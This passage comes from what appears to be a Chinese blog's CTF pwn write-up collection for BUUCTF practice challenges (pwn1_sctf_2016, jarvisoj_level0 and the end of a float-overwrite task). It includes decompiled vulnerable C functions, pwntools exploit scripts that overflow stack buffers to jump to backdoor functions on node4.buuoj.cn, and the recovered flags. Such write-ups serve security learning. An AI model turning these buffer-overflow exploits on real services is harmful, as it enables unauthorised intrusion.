11.28125</code>即可获得flag，先看总的容量为<code>0x30</code>个字节的大小。</p><p>然后是将空间分成的是v1和v2两个部分，共是<code>0x30</code>，v2的大小为<code>0x4</code>。目标就是把v2这一块空间内的数据写成<code>11.28125</code>转为十六进制是<code>0x41348000</code>。</p><p>然后利用脚本就是下面的</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">27852</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x4</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x41348000</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;652624f4-f9cc-498c-a675-42a5143e9b49&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="pwn1-sctf-2016"><a href="#pwn1-sctf-2016" class="headerlink" title="pwn1_sctf_2016"></a>pwn1_sctf_2016</h4><p><strong>TAG: 替换字符造成栈溢出</strong></p><p>这个对gets到的字符的个数有了限制，但是<code>strcpy(s, v0);</code>，v0可控似乎是，下面是反汇编出来的主要的c代码，说实话我没怎么看懂。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> <span class="token function">vuln</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span>v0<span class="token punctuation">;</span> <span class="token comment">// eax</span>  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+1Ch] [ebp-3Ch] BYREF</span>  <span class="token keyword">char</span> v3<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+3Ch] [ebp-1Ch] BYREF</span>  <span class="token keyword">char</span> v4<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+40h] [ebp-18h] BYREF</span>  <span class="token keyword">char</span> v5<span class="token punctuation">;</span> <span class="token comment">// [esp+47h] [ebp-11h] BYREF</span>  <span class="token keyword">char</span> v6<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+48h] [ebp-10h] BYREF</span>  <span class="token keyword">char</span> v7<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [esp+4Fh] [ebp-9h] BYREF</span>  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tell me something about yourself: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">32</span><span class="token punctuation">,</span> edata<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">allocator</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>v4<span class="token punctuation">,</span> <span class="token string">"you"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token function">allocator</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">string</span><span class="token punctuation">(</span>v6<span class="token punctuation">,</span> <span class="token string">"I"</span><span class="token punctuation">,</span> v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">replace</span><span class="token punctuation">(</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string <span class="token operator">*</span><span class="token punctuation">)</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span>operator<span class="token operator">=</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>input<span class="token punctuation">,</span> v3<span class="token punctuation">,</span> v6<span class="token punctuation">,</span> v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v6<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span><span class="token function">allocator</span><span class="token punctuation">(</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token operator">~</span><span class="token function">string</span><span class="token punctuation">(</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>  std<span class="token operator">::</span>allocator<span class="token operator">&lt;</span><span class="token keyword">char</span><span class="token operator">></span><span class="token operator">::</span><span class="token operator">~</span><span class="token function">allocator</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token keyword">const</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token punctuation">)</span>std<span class="token operator">::</span>string<span class="token operator">::</span><span class="token function">c_str</span><span class="token punctuation">(</span><span class="token punctuation">(</span>std<span class="token operator">::</span>string <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>input<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">strcpy</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> v0<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"So, %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这里网上的教程说是前面间接有个对传入的内容有一个把<code>I</code>换成<code>you</code>的替换操作，这里就可以间接地造成栈溢出，感觉就像是web里面的<code>php反序列化的字符逃逸</code>，然后看看s的空间分配的大小是<code>0x3c</code></p><p><img src="/2021/05/28/CTF/image-20210718102812281.png" alt></p><p>然后<code>0x3c = 16x3+12 = 60</code>，传入<code>20</code>个<code>I</code>即可，可写payload如下</p><p><img src="/2021/05/28/CTF/image-20210718103142615.png" alt></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25512</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"I"</span> <span class="token operator">*</span> <span class="token number">20</span> <span class="token operator">+</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token number">4</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x08048F0D</span><span class="token punctuation">)</span>  <span class="token comment"># 好像是因为32位的返回地址是4个字节，需要填充4个字符a</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;3ef70652-fbd5-4ee2-a6d0-b94061892eb1&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="缓冲区溢出"><a href="#缓冲区溢出" class="headerlink" title="缓冲区溢出"></a>缓冲区溢出</h3><h4 id="jarvisoj-level0"><a href="#jarvisoj-level0" class="headerlink" title="jarvisoj_level0"></a>jarvisoj_level0</h4><p><strong>TAG: read造成buf缓冲区溢出</strong></p><p>看有的wp说是read函数造成缓冲区溢出，下面是主要的代码</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">ssize_t <span class="token function">vulnerable_function</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-80h] BYREF</span>  <span class="token keyword">return</span> <span class="token function">read</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x200uLL</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后这个buf的大小是<code>0x80</code>也就是十进制的<code>128</code>，然后缓冲区溢出就是将栈的返回地址改成后门函数的地址，注意到数据栈的返回地址<code>(r)</code>是<code>0x8</code></p><p><img src="/2021/05/28/CTF/image-20210718125634274.png" alt></p><p>然后后门函数的地址为<code>0x400596</code></p><p><img src="/2021/05/28/CTF/image-20210718125729564.png" alt></p><p>所以利用方式如下所示</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'node4.buuoj.cn'</span><span class="token punctuation">,</span> <span class="token number">25015</span><span class="token punctuation">)</span>buf_1 <span class="token operator">=</span> <span class="token string">b"a"</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x80</span> <span class="token operator">+</span> <span class="token number">0x8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x400596</span><span class="token punctuation">)</span>p<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>buf_1<span class="token punctuation">)</span>p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment"># flag&#123;3d0a1531-3486-4d69-aa6a-010088aa45bf&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="ciscn-2019-c-1"><a href="#ciscn-2019-c-1" class="headerlink" title="ciscn_2019_c_1"></a>ciscn_2019_c_1</h4><p><strong>TAG: </strong></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> misc </tag>
            
            <tag> web </tag>
            
            <tag> crypto </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
